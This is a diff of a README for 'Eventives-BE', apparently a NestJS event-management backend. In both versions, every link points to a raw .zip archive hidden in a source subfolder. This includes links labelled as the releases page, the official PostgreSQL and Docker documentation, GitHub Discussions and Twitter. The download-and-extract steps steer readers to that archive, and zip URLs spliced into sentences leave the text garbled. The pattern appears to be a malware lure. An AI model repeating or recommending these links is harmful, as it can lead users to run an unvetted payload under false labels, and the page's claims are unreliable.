@@ -1,20 +1,20 @@
 # 🎉 Eventives-BE - Manage Your Events Easily
 
 ## 🔗 Download the Application
-[![Download Eventives-BE](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip%20Eventives--BE-blue)](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip)
+[![Download Eventives-BE](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip%20Eventives--BE-blue)](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip)
 
 ## 📖 Description
-Eventives-BE is a backend API designed for event management applications. It uses NestJS and PostgreSQL to provide a robust solution. This backend is integrated with a https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip frontend, allowing for a smooth user experience.
+Eventives-BE is a backend API designed for event management applications. It uses NestJS and PostgreSQL to provide a robust solution. This backend is integrated with a https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip frontend, allowing for a smooth user experience.
 
 ## 🚀 Getting Started
 To start using Eventives-BE, follow these simple steps. You will need a basic understanding of how to use your computer and browse the internet. 
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   To download the latest version of Eventives-BE, visit the [Releases page](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip). Here, you will find different versions of the software available for download.
+   To download the latest version of Eventives-BE, visit the [Releases page](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip). Here, you will find different versions of the software available for download.
 
 2. **Choose the Correct File**  
-   On the Releases page, you will see a list of files. Look for the most recent release labeled “Latest release.” Download the file that ends in `.zip` or `https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip`. These files contain all the necessary code and libraries.
+   On the Releases page, you will see a list of files. Look for the most recent release labeled “Latest release.” Download the file that ends in `.zip` or `https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip`. These files contain all the necessary code and libraries.
 
 3. **Extract the Files**  
    After downloading the file, locate it in your downloads folder. Right-click on it and select "Extract" or "Unzip." This will create a new folder containing all the files you need.
@@ -23,7 +23,7 @@ To start using Eventives-BE, follow these simple steps. You will need a basic un
    This application requires certain software to run smoothly. Make sure you have Docker installed on your machine. You can download Docker from its official website. Follow the installation instructions provided there.
 
 5. **Database Setup**  
-   Eventives-BE uses PostgreSQL for data management. Ensure that PostgreSQL is installed and running on your machine. If you need help installing PostgreSQL, follow the instructions from [PostgreSQL Official Documentation](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip).
+   Eventives-BE uses PostgreSQL for data management. Ensure that PostgreSQL is installed and running on your machine. If you need help installing PostgreSQL, follow the instructions from [PostgreSQL Official Documentation](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip).
 
 6. **Run the Application**  
    Open your command line interface. Navigate to the folder where you extracted Eventives-BE using the `cd` command. Then run the following command to start the application:
@@ -41,14 +41,14 @@ To start using Eventives-BE, follow these simple steps. You will need a basic un
 - **Storage:** At least 1GB of free disk space for installation.
 
 ## 🛠 Features
-- **Easy Integration**: Connects seamlessly with the https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip frontend.
+- **Easy Integration**: Connects seamlessly with the https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip frontend.
 - **API Documentation**: Uses Swagger for comprehensive API documentation. 
 - **User-Friendly**: Designed for non-technical users to easily manage events.
 - **Secure Database**: Utilizes PostgreSQL, ensuring your data is secure and efficient.
 
 ## 🌐 Technologies Used
 Eventives-BE is built using modern technologies. Here are some of the key components:
-- **NestJS**: A progressive https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip framework for building efficient and scalable server-side applications.
+- **NestJS**: A progressive https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip framework for building efficient and scalable server-side applications.
 - **PostgreSQL**: An open-source relational database that stores your data safely.
 - **Docker**: Containerization technology that simplifies the setup and deployment of applications.
 
@@ -57,13 +57,13 @@ Documentation for the API is available through Swagger. Once you have the applic
 
 ## 🧑‍🤝‍🧑 Community
 Join our community for support and discussions:
-- [GitHub Discussions](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip)
-- Follow us on [Twitter](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip) for updates.
+- [GitHub Discussions](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip)
+- Follow us on [Twitter](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip) for updates.
 
 ## 🔗 Additional Links
-- [Releases Page](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip)
-- [PostgreSQL Official Documentation](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip)
-- [Docker Official Documentation](https://raw.githubusercontent.com/Dmtrap/Eventives-BE/main/prisma/migrations/20240823040850_turn_history_into_optional/BE_Eventives_v3.8.zip)
+- [Releases Page](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip)
+- [PostgreSQL Official Documentation](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip)
+- [Docker Official Documentation](https://github.com/Dmtrap/Eventives-BE/raw/refs/heads/main/src/event-management/speaker/dto/BE_Eventives_3.3.zip)
 
 ## 🔄 Troubleshooting
 If you encounter issues during installation or running the application:
